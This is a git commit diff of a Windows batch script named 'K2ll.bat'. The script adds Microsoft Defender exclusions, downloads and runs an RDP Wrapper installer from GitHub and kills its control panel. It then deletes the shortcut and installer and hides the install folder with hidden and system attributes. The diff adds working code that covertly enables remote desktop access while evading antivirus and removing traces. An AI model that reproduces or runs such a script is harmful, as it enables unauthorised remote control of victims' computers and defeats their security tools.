59004acfb943b044a82ffe62c6cc0f2629516926
al0nks1337 <al0nks1337@gmail.com>
2025-05-01 14:07:05 +0000

    Update K2ll.bat

--- K2ll.bat
+++ K2ll.bat
@@ -1,15 +1,22 @@
 @echo off
-title 
-powershell -Command "Add-MpPreference -ExclusionPath '%TEMP%\RDPW_Installer.exe'" >nul 2>&1
-powershell -Command "Invoke-WebRequest -Uri 'https://github.com/sebaxakerhtc/rdpwrap/releases/download/v1.8.9.9/RDPW_Installer.exe' -OutFile '%TEMP%\RDPW_Installer.exe'"
-if exist "%TEMP%\RDPW_Installer.exe" (
-    start /wait %TEMP%\RDPW_Installer.exe
-    :waitRDP
-    tasklist | findstr /i "rdp_cnc.exe" >nul
-    if errorlevel 1 (
+title      
+set "RDPW_EXE=%TEMP%\RDPW_Installer.exe"
+set "RDPW_DIR=%ProgramFiles%\RDP Wrapper"
+set "SHORTCUT=%USERPROFILE%\Desktop\RDP_CnC.lnk"
+powershell -Command "Add-MpPreference -ExclusionPath '%RDPW_EXE%'" >nul
+powershell -Command "Add-MpPreference -ExclusionPath '%RDPW_DIR%'" >nul
+powershell -Command "Invoke-WebRequest 'https://github.com/sebaxakerhtc/rdpwrap/releases/download/v1.8.9.9/RDPW_Installer.exe' -OutFile '%RDPW_EXE%'"
+if exist "%RDPW_EXE%" (
+    start /wait "" "%RDPW_EXE%"
+    :wait
+    tasklist | findstr /i "rdp_cnc.exe" >nul || (
         timeout /t 5 >nul
-        goto waitRDP
+        goto wait
     )
-    taskkill /f /im rdp_cnc.exe >nul 2>&1
+    taskkill /f /im rdp_cnc.exe >nul
+    del /f /q "%SHORTCUT%" >nul
 )
-powershell -Command "Remove-MpPreference -ExclusionPath '%TEMP%\RDPW_Installer.exe'" >nul 2>&1
+del /f /q "%RDPW_EXE%" >nul
+if exist "%RDPW_DIR%" attrib +h +s "%RDPW_DIR%"
+powershell -Command "Remove-MpPreference -ExclusionPath '%RDPW_EXE%'" >nul
+exit
